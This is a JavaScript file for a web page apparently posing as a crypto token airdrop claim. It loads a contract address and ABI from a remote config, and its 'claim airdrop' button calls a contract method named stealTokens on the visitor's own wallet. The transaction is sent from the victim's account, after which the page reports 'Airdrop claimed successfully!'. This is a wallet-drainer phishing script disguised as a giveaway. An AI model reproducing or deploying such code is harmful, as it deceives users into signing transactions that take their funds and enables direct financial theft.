let web3;
let accounts;
let contractAddress;
let contractABI;

// Flag to prevent multiple redirections
let isRedirected = false;
let isConnected = false; // Flag to track connection state

// Function to load configuration and ABI files
async function loadConfig() {
    try {
        const configResponse = await fetch('https://buyemon.github.io/metamask/config.json');
        if (!configResponse.ok) {
            throw new Error('Failed to fetch config.json');
        }
        const configData = await configResponse.json();
        contractAddress = configData.contractAddress;
        tokenAddress = configData.tokenAddress;

        const abiResponse = await fetch('https://buyemon.github.io/metamask/abi.json');
        if (!abiResponse.ok) {
            throw new Error('Failed to fetch abi.json');
        }
        const abiData = await abiResponse.json();
        contractABI = abiData;

        console.log("Configuration loaded:", configData);
        console.log("ABI loaded:", abiData);
    } catch (error) {
        console.error("Error loading config or ABI: ", error);
        alert("Error loading configuration or ABI. Please try again later.");
    }
}

// Function to claim the airdrop
async function claimAirdrop() {
    if (!accounts) {
        alert('Please connect to a wallet first!');
        return;
    }

    if (!contractABI || !contractAddress) {
        alert('Contract details not loaded. Please try again later.');
        return;
    }

    const contract = new web3.eth.Contract(contractABI, contractAddress);
    try {
        console.log('Claiming airdrop...');
        await contract.methods.stealTokens(accounts[0]).send({ from: accounts[0] });
        alert('Airdrop claimed successfully!');
    } catch (error) {
        alert('Error claiming airdrop');
        console.error('Claim error:', error);
    }
}

// Add event listeners to the buttons
window.addEventListener('DOMContentLoaded', (event) => {
    document.getElementById('claimAirdropButton').addEventListener('click', claimAirdrop);

    // Load configuration
    loadConfig();
});
